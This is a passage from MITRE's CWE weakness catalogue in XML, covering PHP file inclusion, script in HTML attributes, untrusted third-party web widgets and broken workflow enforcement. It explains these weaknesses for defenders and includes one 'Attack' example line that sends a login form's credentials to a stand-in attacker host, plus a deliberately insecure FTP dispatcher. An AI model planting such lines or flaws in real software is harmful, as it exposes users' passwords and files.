               <Reference>CVE-2005-2086</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2086</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0127</Reference>
               <Description>Directory traversal vulnerability in PHP include statement.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0127</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1971</Reference>
               <Description>Directory traversal vulnerability in PHP include statement.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1971</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3335</Reference>
               <Description>PHP file inclusion issue, both remote and local; local include uses ".." and "%00" characters as a manipulation, but many remote file inclusion issues probably have this vector.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3335</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="175"/>
            <Related_Attack_Pattern CAPEC_ID="201"/>
            <Related_Attack_Pattern CAPEC_ID="228"/>
            <Related_Attack_Pattern CAPEC_ID="251"/>
            <Related_Attack_Pattern CAPEC_ID="252"/>
            <Related_Attack_Pattern CAPEC_ID="253"/>
            <Related_Attack_Pattern CAPEC_ID="263"/>
            <Related_Attack_Pattern CAPEC_ID="538"/>
            <Related_Attack_Pattern CAPEC_ID="549"/>
            <Related_Attack_Pattern CAPEC_ID="640"/>
            <Related_Attack_Pattern CAPEC_ID="660"/>
            <Related_Attack_Pattern CAPEC_ID="695"/>
            <Related_Attack_Pattern CAPEC_ID="698"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-76"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2010-11-29</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="83" Name="Improper Neutralization of Script in Attributes in a Web Page" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product does not neutralize or incorrectly neutralizes "javascript:" or other URIs from dangerous attributes within tags, such as onmouseover, onload, onerror, or style.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="79" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-30.1">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>
                  <xhtml:p>Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.</xhtml:p>
                  <xhtml:p>The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-43">
               <Phase>Implementation</Phase>
               <Description>With Struts, write all data from form beans with the bean's filter attribute set to true.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-31">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-0520</Reference>
               <Description>Bypass filtering of SCRIPT tags using onload in BODY, href in A, BUTTON, INPUT, and others.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0520</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1493</Reference>
               <Description>guestbook XSS in STYLE or IMG SRC attributes.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1493</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1965</Reference>
               <Description>Javascript in onerror attribute of IMG tag.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1965</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1495</Reference>
               <Description>XSS in web-based email product via onmouseover event.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1495</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1681</Reference>
               <Description>XSS via script in &lt;P&gt; tag.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1681</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1935</Reference>
               <Description>Onload, onmouseover, and other events in an e-mail attachment.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1935</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0945</Reference>
               <Description>Onmouseover and onload events in img, link, and mail tags.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0945</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1136</Reference>
               <Description>Javascript in onmouseover attribute in e-mail address or URL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1136</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>XSS using Script in Attributes</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="243"/>
            <Related_Attack_Pattern CAPEC_ID="244"/>
            <Related_Attack_Pattern CAPEC_ID="588"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Observed_Example, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Description, Name, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">XSS using Script in Attributes</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-04-05">Failure to Sanitize Script in Attributes in a Web Page</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="830" Name="Inclusion of Web Functionality from an Untrusted Source" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the product, potentially granting total access and control of the product to the untrusted source.</Description>
         <Extended_Description>
            <xhtml:p>Including third party functionality in a web-based environment is risky, especially if the source of the functionality is untrusted.</xhtml:p>
            <xhtml:p>Even if the third party is a trusted source, the product may still be exposed to attacks and malicious behavior if that trusted source is compromised, or if the code is modified in transmission from the third party to the product.</xhtml:p>
            <xhtml:p>This weakness is common in "mashup" development on the web, which may include source functionality from other domains. For example, Javascript-based web widgets may be inserted by using '&lt;SCRIPT SRC="http://other.domain.here"&gt;' tags, which causes the code to run in the domain of the product, not the remote site from which the widget was loaded. As a result, the included code has access to the local DOM, including cookies and other data that the developer might not want the remote site to be able to access.</xhtml:p>
            <xhtml:p>Such dependencies may be desirable, or even required, but sometimes programmers are not aware that a dependency exists.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="829" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-94">
               <Intro_Text>This login webpage includes a weather widget from an external website:</Intro_Text>
               <Example_Code Nature="Bad" Language="HTML">
                  <xhtml:div>&lt;div class="header"&gt; Welcome!<xhtml:div style="margin-left:1em;">&lt;div id="loginBox"&gt;Please Login:<xhtml:div style="margin-left:1em;">&lt;form id ="loginForm" name="loginForm" action="login.php" method="post"&gt;<xhtml:br/>Username: &lt;input type="text" name="username" /&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>Password: &lt;input type="password" name="password" /&gt;<xhtml:br/>&lt;input type="submit" value="Login" /&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>&lt;/div&gt;<xhtml:br/>&lt;div id="WeatherWidget"&gt;<xhtml:div style="margin-left:1em;">&lt;script type="text/javascript" src="externalDomain.example.com/weatherwidget.js"&gt;&lt;/script&gt;</xhtml:div>&lt;/div&gt;</xhtml:div>&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).</Body_Text>
               <Body_Text>For example, user login information could easily be stolen with a single line added to weatherwidget.js:</Body_Text>
               <Example_Code Nature="Attack" Language="JavaScript">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>...Weather widget code....</xhtml:i>
                     <xhtml:br/>document.getElementById('loginForm').action = "ATTACK.example.com/stealPassword.php";</xhtml:div>
               </Example_Code>
               <Body_Text>This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <References>
            <Reference External_Reference_ID="REF-778"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2010-12-08</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="841" Name="Improper Enforcement of Behavioral Workflow" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence.</Description>
         <Extended_Description>
            <xhtml:p>By performing actions in an unexpected order, or by omitting steps, an attacker could manipulate the business logic of the product or cause it to enter an invalid state. In some cases, this can also expose resultant weaknesses.</xhtml:p>
            <xhtml:p>For example, a file-sharing protocol might require that an actor perform separate steps to provide a username, then a password, before being able to transfer files. If the file-sharing server accepts a password command followed by a transfer command, without any username being provided, the product might still perform the transfer.</xhtml:p>
            <xhtml:p>Note that this is different than CWE-696, which focuses on when the product performs actions in the wrong sequence; this entry is closely related, but it is focused on ensuring that the actor performs actions in the correct sequence.</xhtml:p>
            <xhtml:p>Workflow-related behaviors include:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Steps are performed in the expected order.</xhtml:li>
                  <xhtml:li>Required steps are not omitted.</xhtml:li>
                  <xhtml:li>Steps are not interrupted.</xhtml:li>
                  <xhtml:li>Steps are performed in a timely fashion.</xhtml:li>
               </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="691" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Alter Execution Logic</Impact>
               <Note>An attacker could cause the product to skip critical steps or perform them in the wrong order, bypassing its intended business logic. This can sometimes have security implications.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code is part of an FTP server and deals with various commands that could be sent by a user. It is intended that a user must successfully login before performing any other action such as retrieving or listing files.</Intro_Text>
               <Example_Code Nature="Bad" Language="Python">
                  <xhtml:div>def dispatchCommand(command, user, args):<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if command == 'Login':<xhtml:div style="margin-left:1em;">loginUser(args)<xhtml:br/>return</xhtml:div>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># user has requested a file</xhtml:i>
                           <xhtml:br/>if command == 'Retrieve_file':
			   <xhtml:div style="margin-left:1em;">
			   if authenticated(user) and ownsFile(user,args):
			   <xhtml:br/>
			   <xhtml:div style="margin-left:1em;">sendFile(args)<xhtml:br/>return</xhtml:div>
			   </xhtml:div>
                           <xhtml:br/>if command == 'List_files':<xhtml:div style="margin-left:1em;">listFiles(args)<xhtml:br/>return</xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>...</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>The server correctly avoids sending files to a user that isn't logged in and doesn't own the file. However, the server will incorrectly list the files in any directory without confirming the command came from an authenticated user, and that the user is authorized to see the directory's contents.</Body_Text>
               <Body_Text>Here is a fixed version of the above example:</Body_Text>
               <Example_Code Nature="Good" Language="Python">
                  <xhtml:div>def dispatchCommand(command, user, args):<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>...</xhtml:i>
                           <xhtml:br/>if command == 'List_files':<xhtml:div style="margin-left:1em;">if authenticated(user) and ownsDirectory(user,args):<xhtml:div style="margin-left:1em;">listFiles(args)<xhtml:br/>return</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>...</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2011-0348</Reference>
               <Description>Bypass of access/billing restrictions by sending traffic to an unrestricted destination before sending to a restricted destination.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2011-0348</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3012</Reference>
               <Description>Attacker can access portions of a restricted page by canceling out of a dialog.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3012</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-5056</Reference>
               <Description>Ticket-tracking system does not enforce a permission setting.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-5056</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2164</Reference>
               <Description>Shopping cart does not close a database connection when user restores a previous order, leading to connection exhaustion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2164</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0777</Reference>
               <Description>Chain: product does not properly handle dropped connections, leading to missing NULL terminator (CWE-170) and segmentation fault.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0777</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3327</Reference>
               <Description>Chain: Authentication bypass by skipping the first startup step as required by the protocol.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3327</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0829</Reference>
               <Description>Chain: File server crashes when sent a "find next" request without an initial "find first."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0829</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2620</Reference>
               <Description>FTP server allows remote attackers to bypass authentication by sending (1) LIST, (2) RETR, (3) STOR, or other commands without performing the required login steps first.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2620</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3296</Reference>
               <Description>FTP server allows remote attackers to list arbitrary directories as root by running the LIST command before logging in.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3296</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>40</Entry_ID>
               <Entry_Name>Insufficient Process Validation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-795"/>
            <Reference External_Reference_ID="REF-796"/>
            <Reference External_Reference_ID="REF-797"/>
            <Reference External_Reference_ID="REF-806"/>
            <Reference External_Reference_ID="REF-799"/>
            <Reference External_Reference_ID="REF-667"/>
            <Reference External_Reference_ID="REF-801"/>
            <Reference External_Reference_ID="REF-802" Section="pages 29 - 41"/>
         </References>
         <Notes>
            <Note Type="Research Gap">
               <xhtml:p>This weakness is typically associated with business logic flaws, except when it produces resultant weaknesses.</xhtml:p>
               <xhtml:p>The classification of business logic flaws has been under-studied, although exploitation of business flaws frequently happens in real-world systems, and many applied vulnerability researchers investigate them. The greatest focus is in web applications. There is debate within the community about whether these problems represent particularly new concepts, or if they are variations of well-known principles.</xhtml:p>
               <xhtml:p>Many business logic flaws appear to be oriented toward business processes, application flows, and sequences of behaviors, which are not as well-represented in CWE as weaknesses related to input validation, memory management, etc.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2011-03-24</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
